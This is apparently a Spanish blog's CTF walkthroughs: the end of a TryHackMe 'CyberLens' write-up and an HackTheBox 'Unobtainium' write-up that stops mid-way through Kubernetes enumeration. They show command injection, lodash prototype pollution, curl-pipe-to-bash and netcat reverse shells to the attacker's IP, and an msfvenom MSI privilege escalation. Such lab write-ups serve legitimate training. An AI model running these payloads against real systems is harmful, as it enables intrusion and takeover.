Ejecutamos el exploit:\npython2 46540.py cyberlens.thm 61777 \u0026#39;ping 10.9.2.46\u0026#39; Y nos llegan los ping:\n18:33:45.049652 IP cyberlens.thm \u0026gt; 10.9.2.46: ICMP echo request, id 1, seq 1, length 40 18:33:45.049759 IP 10.9.2.46 \u0026gt; cyberlens.thm: ICMP echo reply, id 1, seq 1, length 40 18:33:46.167193 IP cyberlens.thm \u0026gt; 10.9.2.46: ICMP echo request, id 1, seq 2, length 40 18:33:46.167226 IP 10.9.2.46 \u0026gt; cyberlens.thm: ICMP echo reply, id 1, seq 2, length 40 18:33:47.190951 IP cyberlens.thm \u0026gt; 10.9.2.46: ICMP echo request, id 1, seq 3, length 40 18:33:47.190971 IP 10.9.2.46 \u0026gt; cyberlens.thm: ICMP echo reply, id 1, seq 3, length 40 18:33:48.113067 IP cyberlens.thm \u0026gt; 10.9.2.46: ICMP echo request, id 1, seq 4, length 40 18:33:48.113096 IP 10.9.2.46 \u0026gt; cyberlens.thm: ICMP echo reply, id 1, seq 4, length 40 Ahora vamos a mandarnos una reverse shell.\nPrimero localizamos el nc.exe en nuestro sistema y nos lo copiamos en el directorio actual\nlocate nc.exe /home/d3bo/Desktop/cyberlens/nc.exe /home/d3bo/Downloads/nc.exe /usr/share/seclists/Web-Shells/FuzzDB/nc.exe /usr/share/windows-resources/binaries/nc.exe cp /usr/share/windows-resources/binaries/nc.exe . Después iniciamos un servidor en python para poder luego descargar el archivo en la máquina víctima\npython3 -m http.server 80 Nos ponemos en escucha para recibir la reverse shell\nrlwrap nc -nlvp 443 Y ejecutamos el exploit\npython2 46540.py cyberlens.thm 61777 \u0026#39;curl 10.9.2.46/nc.exe -o %TEMP%/nc.exe \u0026amp;\u0026amp; %TEMP%/nc.exe -e cmd 10.9.2.46 443\u0026#39; Lo que hace esto es que nos descargamos con curl el nc.exe en la máquina víctima en el directorio temp y después ejecutamos el nc.exe para mandarnos una reverse shell.\nEscalada de privilegios Al comprobar si tenemos el permiso AlwaysInstallElevated activado\nPS C:\\Windows\\system32\u0026gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1 PS C:\\Windows\\system32\u0026gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1 Vemos que si está habilitado. Esto lo podríamos haber encontrado con winpeas, powerup.ps1\u0026hellip;\nPS C:\\Users\\cyberlens\u0026gt; IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://10.9.2.46/PowerUp.ps1\u0026#39;) PS C:\\Users\\cyberlens\u0026gt; Invoke-AllChecks ModifiablePath : C:\\Users\\CyberLens\\AppData\\Local\\Microsoft\\WindowsApps IdentityReference : CYBERLENS\\CyberLens Permissions : {WriteOwner, Delete, WriteAttributes, Synchronize...} %PATH% : C:\\Users\\CyberLens\\AppData\\Local\\Microsoft\\WindowsApps Name : C:\\Users\\CyberLens\\AppData\\Local\\Microsoft\\WindowsApps Check : %PATH% .dll Hijacks AbuseFunction : Write-HijackDll -DllPath \u0026#39;C:\\Users\\CyberLens\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll\u0026#39; Check : AlwaysInstallElevated Registry Key AbuseFunction : Write-UserAddMSI El hecho de tener este privilegio nos permite poder instalar cosas como administrador sin autentificación, para aprovecharnos de esto, creamos un .msi malicioso\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.2.46 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi Nos lo pasamos a la máquina víctima\ncurl 10.9.2.46/evil.msi -o evil.msi Nos ponemos en escucha\nrlwarp nc -nlvp 443 Ejecutamos el .msi\n.\\evil.msi Nos llega la shell como\nnt authority\\system Máquina completada!\n","date":"2024-06-23","id":20,"permalink":"/writeups/tryhackme/cyberlens/","summary":"En esta máquina, explotamos una vulnerabilidad CVE presente en Tika 1.17, lo que nos permite inyectar comandos en la máquina víctima. Para la escalada de privilegios, aprovechamos la configuración del privilegio AlwaysInstallElevated, logrando así obtener una shell con permisos de NT AUTHORITY/SYSTEM.","tags":["AlwaysInstallElevated"],"title":"Cyberlens"},{"content":"","date":"2024-06-23","id":21,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"},{"content":"","date":"2024-06-18","id":22,"permalink":"/tags/kubernetes/","summary":"","tags":[],"title":"Kubernetes"},{"content":"","date":"2024-06-18","id":23,"permalink":"/tags/os-command-injection/","summary":"","tags":[],"title":"OS command injection"},{"content":"","date":"2024-06-18","id":24,"permalink":"/tags/pivoting/","summary":"","tags":[],"title":"Pivoting"},{"content":"","date":"2024-06-18","id":25,"permalink":"/tags/prototype-pollution/","summary":"","tags":[],"title":"Prototype pollution"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.235 PING 10.10.10.235 (10.10.10.235) 56(84) bytes of data. 64 bytes from 10.10.10.235: icmp_seq=1 ttl=63 time=175 ms --- 10.10.10.235 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 175.026/175.026/175.026/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.235 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.235 5 │ [*] Open ports: 22,80,8443,31337,10250,10251 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p22,80,8443,31337,10250,10251 -sCV 10.10.10.235 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18💿9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Unobtainium 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 401 Unauthorized | Audit-Id: aafb70ca-6fef-48e4-9836-d57c119bed8d | Cache-Control: no-cache, private | Content-Type: application/json | Date: Wed, 12 Jun 2024 22:07:50 GMT | Content-Length: 129 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 401 Unauthorized | Audit-Id: ea15ea5d-000a-4a41-a427-8815265b480b | Cache-Control: no-cache, private | Content-Type: application/json | Date: Wed, 12 Jun 2024 22:07:50 GMT | Content-Length: 129 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} | HTTPOptions: | HTTP/1.0 401 Unauthorized | Audit-Id: 746cb85a-03d1-4509-8e50-d3911982b1fa | Cache-Control: no-cache, private | Content-Type: application/json | Date: Wed, 12 Jun 2024 22:07:50 GMT | Content-Length: 129 |_ {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} | ssl-cert: Subject: commonName=k3s/organizationName=k3s | Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:unobtainium, IP Address:10.10.10.235, IP Address:10.129.136.226, IP Address:10.43.0.1, IP Address:127.0.0.1 | Not valid before: 2022-08-29T09:26:11 |_Not valid after: 2024-10-26T13:35:54 |_http-title: Site doesn\u0026#39;t have a title (application/json). | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:unobtainium, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.10.235 | Not valid before: 2022-08-29T09:26:11 |_Not valid after: 2025-06-12T21:59:31 |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 10251/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 Not Found | Cache-Control: no-cache, private | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Wed, 12 Jun 2024 22:08:10 GMT | Content-Length: 19 | page not found | GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest, HTTPOptions: | HTTP/1.0 404 Not Found | Cache-Control: no-cache, private | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Wed, 12 Jun 2024 22:07:44 GMT | Content-Length: 19 |_ page not found 31337/tcp open http Node.js Express framework | http-methods: |_ Potentially risky methods: PUT DELETE |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos App Comenzamos accediendo al sitio web que se encuentra en el puerto 80.\nParece que la máquina aloja una aplicación de chat. Desde la página web, podemos descargar la aplicación.\nAl descargar, obtenemos un archivo comprimido llamado unobtainium_debian.zip.\n\u0026gt; ls | grep unobtainium unobtainium_debian.zip Después de descomprimirlo, encontramos un archivo .deb, que instalamos con sudo apt install ./unobtainium_1.0.0_amd64.deb.\nUna vez ya lo tenemos instalado, lo ejecutamos con el comando unobtainium.\nAl ejecutarse, se abre una ventana, que nos dice que no encuentra el dominio unobtainium.htb, para que lo encuentre lo añadimos en el /etc/hosts apuntando a la ip de la máquina víctima. Con este mensaje deducimos que la aplicación no funciona solo en local, sino que se conecta a un servidor\u0026hellip;\nLa aplicación tiene 3 funciones:\nMessage Log:\nPost Message:\nTodo:\nComo vimos antes, esta aplicación se conecta al servidor unobtainium.htb, asi que con wireshark vamos a interceptar que comunicaciones se están produciendo entre la aplicación y el servidor cuando hacemos alguna de las 3 funciones mencionadas anteriormente.\nPost Message:\nSe está mandando una petición con el método PUT a unobtainium.htb:31337. Como data estamos mandando en json lo siguiente:\n{ \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;message\u0026#34;: { \u0026#34;text\u0026#34;: \u0026#34;Testing3\u0026#34; } } Al principio se lleva a cabo una autentificación un usuario y contraseña y después se manda el mensaje.\nMessage Log:\nSimplemente, se hace una petición GET a unobtainium.htb:31337, y en la respuesta vemos el log de los mensajes enviados al servidor\n{ \u0026#34;icon\u0026#34;: \u0026#34;__\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Testing3\u0026#34;, \u0026#34;id\u0026#34;: 1, \u0026#34;timestamp\u0026#34;: 1718709973974, \u0026#34;userName\u0026#34;: \u0026#34;felamos\u0026#34; } Todo:\nEn la sección de todo, se hace una petición con el método POST a unobtainium.htb:31337/todo, y como data ponemos lo que parece ser el nombre de un archivo\n{ \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;filename\u0026#34;: \u0026#34;todo.txt\u0026#34; } En la respuesta, vemos lo que parece ser el contenido de dicho archivo\n{ \u0026#34;ok\u0026#34;: true, \u0026#34;content\u0026#34;: [ \u0026#34;1. Create administrator zone.\u0026#34;, \u0026#34;2. Update Node.js API Server.\u0026#34;, \u0026#34;3. Add Login functionality.\u0026#34;, \u0026#34;4. Complete Get Messages feature.\u0026#34;, \u0026#34;5. Complete ToDo feature.\u0026#34;, \u0026#34;6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\u0026#34;, \u0026#34;7. Improve security\u0026#34; ] } Con esto lo primero que se nos puede pasar por la cabeza es un lfi\ncurl -s -X POST http://unobtainium.htb:31337/todo -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;auth\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;felamos\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;Winter2021\u0026#34;},\u0026#34;filename\u0026#34;:\u0026#34;/etc/passwd\u0026#34;}\u0026#39; curl -s -X POST http://unobtainium.htb:31337/todo -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;auth\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;felamos\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;Winter2021\u0026#34;},\u0026#34;filename\u0026#34;:\u0026#34;../../../../../../../etc/passwd\u0026#34;}\u0026#39; curl -s -X POST http://unobtainium.htb:31337/todo -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;auth\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;felamos\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;Winter2021\u0026#34;},\u0026#34;filename\u0026#34;:\u0026#34;....//....//....//....//....//....//....//etc/passwd\u0026#34;}\u0026#39; Pero no conseguimos ver el /etc/passwd\nSi recordamos, nmap dijo que estábamos ante un NodeJS en el puerto 31337, así que en la raíz del proyecto tiene que haber un index.js, vamos a intentar verlo\ncurl -s -X POST http://unobtainium.htb:31337/todo -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;auth\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;felamos\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;Winter2021\u0026#34;},\u0026#34;filename\u0026#34;:\u0026#34;index.js\u0026#34;}\u0026#39; {\u0026#34;ok\u0026#34;:true,\u0026#34;content\u0026#34;:\u0026#34;var root = require(\\\u0026#34;google-cloudstorage-commands\\\u0026#34;);\\nconst express = require(\u0026#39;express\u0026#39;);\\nconst { exec } = require(\\\u0026#34;child_process\\\u0026#34;);\\nconst bodyParser = require(\u0026#39;body-parser\u0026#39;);\\nconst _ = require(\u0026#39;lodash\u0026#39;);\\nconst app = express();\\nvar fs = require(\u0026#39;fs\u0026#39;);\\n\\nconst users = [\\n {name: \u0026#39;felamos\u0026#39;, password: \u0026#39;Winter2021\u0026#39;},\\n {name: \u0026#39;admin\u0026#39;, password: Math.random().toString(32), canDelete: true, canUpload: true},\\n];\\n\\nlet messages = [];\\nlet lastId = 1;\\n\\nfunction findUser(auth) {\\n return users.find((u) =\u0026gt;\\n u.name === auth.name \u0026amp;\u0026amp;\\n u.password === auth.password);\\n}\\n\\napp.use(bodyParser.json());\\n\\napp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\\n res.send(messages);\\n});\\n\\napp.put(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\\n const user = findUser(req.body.auth || {});\\n\\n if (!user) {\\n res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;});\\n return;\\n }\\n\\n const message = {\\n icon: \u0026#39;__\u0026#39;,\\n };\\n\\n _.merge(message, req.body.message, {\\n id: lastId++,\\n timestamp: Date.now(),\\n userName: user.name,\\n });\\n\\n messages.push(message);\\n res.send({ok: true});\\n});\\n\\napp.delete(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\\n const user = findUser(req.body.auth || {});\\n\\n if (!user || !user.canDelete) {\\n res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;});\\n return;\\n }\\n\\n messages = messages.filter((m) =\u0026gt; m.id !== req.body.messageId);\\n res.send({ok: true});\\n});\\napp.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; {\\n const user = findUser(req.body.auth || {});\\n if (!user || !user.canUpload) {\\n res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;});\\n return;\\n }\\n\\n\\n filename = req.body.filename;\\n root.upload(\\\u0026#34;./\\\u0026#34;,filename, true);\\n res.send({ok: true, Uploaded_File: filename});\\n});\\n\\napp.post(\u0026#39;/todo\u0026#39;, (req, res) =\u0026gt; {\\n const user = findUser(req.body.auth || {});\\n if (!user) {\\n res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;});\\n return;\\n }\\n\\n filename = req.body.filename;\\n testFolder = \\\u0026#34;/usr/src/app\\\u0026#34;;\\n fs.readdirSync(testFolder).forEach(file =\u0026gt; {\\n if (file.indexOf(filename) \u0026gt; -1) {\\n var buffer = fs.readFileSync(filename).toString();\\n res.send({ok: true, content: buffer});\\n }\\n });\\n});\\n\\napp.listen(3000);\\nconsole.log(\u0026#39;Listening on port 3000...\u0026#39;);\\n\u0026#34;} var root = require(\u0026#34;google-cloudstorage-commands\u0026#34;); const express = require(\u0026#39;express\u0026#39;); const { exec } = require(\u0026#34;child_process\u0026#34;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const _ = require(\u0026#39;lodash\u0026#39;); const app = express(); var fs = require(\u0026#39;fs\u0026#39;); const users = [ {name: \u0026#39;felamos\u0026#39;, password: \u0026#39;Winter2021\u0026#39;}, {name: \u0026#39;admin\u0026#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, ]; let messages = []; let lastId = 1; function findUser(auth) { return users.find((u) =\u0026gt; u.name === auth.name \u0026amp;\u0026amp; u.password === auth.password); } app.use(bodyParser.json()); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(messages); }); app.put(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;}); return; } const message = { icon: \u0026#39;__\u0026#39;, }; _.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name, }); messages.push(message); res.send({ok: true}); }); app.delete(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canDelete) { res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;}); return; } messages = messages.filter((m) =\u0026gt; m.id !== req.body.messageId); res.send({ok: true}); }); app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canUpload) { res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;}); return; } filename = req.body.filename; root.upload(\u0026#34;./\u0026#34;, filename, true); res.send({ok: true, Uploaded_File: filename}); }); app.post(\u0026#39;/todo\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;}); return; } filename = req.body.filename; testFolder = \u0026#34;/usr/src/app\u0026#34;; fs.readdirSync(testFolder).forEach(file =\u0026gt; { if (file.indexOf(filename) \u0026gt; -1) { var buffer = fs.readFileSync(filename).toString(); res.send({ok: true, content: buffer}); } }); }); app.listen(3000); console.log(\u0026#39;Listening on port 3000...\u0026#39;); Ahora ya tenemos mucha más información sobre la aplicación.\nAl principio del código se declaran 2 usuarios:\nconst users = [ {name: \u0026#39;felamos\u0026#39;, password: \u0026#39;Winter2021\u0026#39;}, {name: \u0026#39;admin\u0026#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, ]; Felamos ya lo conocíamos, pero aparece un usuario nuevo, admin, la password no la podemos ver, ya que es random y se genera durante la ejecución. Aparte del nombre y la contraseña, vemos que hay 2 \u0026lsquo;roles\u0026rsquo;: canDelete y canUpload, el admin, tiene los 2 en True, pero Felamos, no tiene ninguno de los 2.\nEncontramos una función nueva, upload, esta función solo la pueden hacer los usuarios con rol can Upload.\napp.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canUpload) { res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;}); return; } filename = req.body.filename; root.upload(\u0026#34;./\u0026#34;, filename, true); res.send({ok: true, Uploaded_File: filename}); }); El archivo se sube con root.upload, pero de donde sale eso?\nEn la parte superior del código se importa google-cloudstorage-commands\nvar root = require(\u0026#34;google-cloudstorage-commands\u0026#34;); Con una búsqueda en internet, descubrimos que es vulnerable a un OS command injection: https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431\nEste es el PoC:\nvar root = require(\u0026#34;google-cloudstorage-commands\u0026#34;); root.upload(\u0026#34;./\u0026#34;,\u0026#34;\u0026amp; touch JHU\u0026#34;, true); Parece que es un OS Command Inejction muy simple.\nEsto está muy bien, pero no podemos subir archivos, ya que el usuario Felamos no tiene el rol para hacerlo. Vamos a seguir enumerando\u0026hellip;\nEn la función de subida de mensajes, vemos como se hace un merge sin sanitización de prototype pollution\napp.put(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: \u0026#39;Access denied\u0026#39;}); return; } const message = { icon: \u0026#39;__\u0026#39;, }; _.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name, }); messages.push(message); res.send({ok: true}); }); Podemos intentar hacer un prototype pollution y poner canUpload en true, el prototype pollution lo podemos colar en req.body.message.\ncurl -X PUT \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;message\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;something\u0026#34;, \u0026#34;__proto__\u0026#34;: { \u0026#34;canUpload\u0026#34;: true } } }\u0026#39; \\ http://unobtainium.htb:31337 Ahora TODOS los usuarios tendrán el canUpload en true.\n┌──(d3bo㉿kali)-[~/Downloads] └─$ curl -X POST unobtainium.htb:31337/upload -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; },\u0026#34;filename\u0026#34;: \u0026#34;malicious-script.js\u0026#34;}\u0026#39; {\u0026#34;ok\u0026#34;:false,\u0026#34;error\u0026#34;:\u0026#34;Access denied\u0026#34;} ┌──(d3bo㉿kali)-[~/Downloads] └─$ curl -X PUT -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;message\u0026#34;: {\u0026#34;test\u0026#34;: \u0026#34;something\u0026#34;,\u0026#34;__proto__\u0026#34;: {\u0026#34;canUpload\u0026#34;: true}}}\u0026#39; http://unobtainium.htb:31337 {\u0026#34;ok\u0026#34;:true} ┌──(d3bo㉿kali)-[~/Downloads] └─$ curl -X POST unobtainium.htb:31337/upload -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; },\u0026#34;filename\u0026#34;: \u0026#34;malicious-script.js\u0026#34;}\u0026#39; {\u0026#34;ok\u0026#34;:true,\u0026#34;Uploaded_File\u0026#34;:\u0026#34;malicious-script.js\u0026#34;} Ya podemos subir archivos!\nSi recordamos el CVE que detectamos anteriormente, podemos usarlo para ejecutar comandos. Para comprobar que tenemos ejecución remota de comandos, nos ponemos en escucha de paquetes icmp con tcpdump por la interfaz tun 0\n$ sudo tcpdump -i tun0 icmp Y mandamos el payload\n$ curl -X POST unobtainium.htb:31337/upload -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; },\u0026#34;filename\u0026#34;: \u0026#34;\u0026amp; ping -c 1 10.10.14.47\u0026#34;}\u0026#39; {\u0026#34;ok\u0026#34;:true,\u0026#34;Uploaded_File\u0026#34;:\u0026#34;\u0026amp; ping -c 1 10.10.14.47\u0026#34;} Funicona!!!\nNos llega el paquete icmp\n16:18:51.721013 IP unobtainium.htb \u0026gt; 10.10.14.47: ICMP echo request, id 51165, seq 1, length 64 16:18:51.721055 IP 10.10.14.47 \u0026gt; unobtainium.htb: ICMP echo reply, id 51165, seq 1, length 64 Para conseguir la reverse shell creamos un archivo llamado shell y dentro le ponemos el código de la reverse shell, y posteriormente creamos un servidor con python para poder acceder a este archivo desde la máquina víctima\n$ cat shell bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.47/443 0\u0026gt;\u0026amp;1\u0026#34; $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Nos ponemos en escucha por el puerto 443 para recibir la reverse shell\nnc -nlvp 443 Y por último mandamos el payload\ncurl -X POST unobtainium.htb:31337/upload -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; },\u0026#34;filename\u0026#34;: \u0026#34;\u0026amp; curl 10.10.14.47/shell | bash\u0026#34;}\u0026#39; Ya tenemos la reverse shell\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.10.235] 9372 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@webapp-deployment-9546bc7cb-zjnnh:/usr/src/app# Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Escalada de privilegios Estamos dentro de un contenedor como root, así que tenemos que conseguir salir. Para enumerar el contenedor usamos linpeas.sh, que es una herramienta para automatizar el reconocimiento para escaladas de privilegios y contendores.\nPara enumerar kubernetes vamos a subir el binario kubectl a la máquina\nComprobamos si podemos listar namespaces\nroot@webapp-deployment-9546bc7cb-zjnnh:~# ./kubectl auth can-i list namespaces Warning: resource \u0026#39;namespaces\u0026#39; is not namespace scoped yes Efectivamente, podemos, así que los listamos\nroot@webapp-deployment-9546bc7cb-zjnnh:~# ./kubectl get namespaces NAME STATUS AGE default Active 659d kube-system Active 659d kube-public Active 659d kube-node-lease Active 659d dev Active 659d Hay una namespace que llama la atención por su nombre dev, lo que podemos hacer ahora es listar los pods del namespace dev\nroot@webapp-deployment-9546bc7cb-zjnnh:~# ./kubectl get pods -n dev NAME READY STATUS RESTARTS AGE devnode-deployment-776dbcf7d6-g4659 1/1 Running 6 (235d ago) 659d devnode-deployment-776dbcf7d6-7gjgf 1/1 Running 6 